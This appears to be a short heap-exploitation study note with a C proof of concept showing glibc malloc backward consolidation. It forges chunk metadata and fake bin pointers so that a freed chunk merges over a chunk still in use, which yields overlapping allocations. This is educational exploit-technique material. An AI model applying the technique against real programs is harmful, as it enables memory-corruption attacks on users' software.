<details>
<summary><strong>Description</strong></summary>
<p>

so in this instance, we will consolidate a chunk backwards, instead of forwards... 

with forward consolidation, we created fake chunks, and consolidated those. In this instance, we will consolidate existing chunks...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {

    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, *chunk2, *consolidated_chunk;

    chunk0 = malloc(0x20);
    chunk1 = malloc(0x420); // backward consolidate chunk1 into chunk0
    chunk2 = malloc(0x20); // this chunk stored fake main_arena

    chunk1[-2] = (0x20 + 0x10); // fake chunk1's prev_size (equal to chunk0's size)

    /*VULNERABILITY*/
    chunk1[-1] = (0x420 + 0x10); // turn off prev_inuse bit of chunk1's size field
    /*VULNERABILITY*/

    // set up fake arena (there is no side effect, bins mechanics act normal, this is needed to bypass mitigations during consolidation)
    chunk0[0] = (long)chunk2; // set our fwd/bk ptrs chunk0 to chunk2 (fake main_arena)
    chunk0[1] = (long)chunk2;

    chunk2[2] = (long)&chunk0[-2]; // set our fwd/bk ptrs for our fake main_arena to chunk0
    chunk2[3] = (long)&chunk0[-2];

    free(chunk1); // trigger backward consolidation
    consolidated_chunk = malloc((0x420 + 0x10) + (0x20 + 0x10) - 0x10 + 8); // allocate chunk from unsortebin, becareful the request size..

    printf("consolidated chunk: %p\n", consolidated_chunk);
    printf("chunk0 (still in use): %p\n", chunk0);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/malloc/bk_consolidation/readme.md

</p>
</details>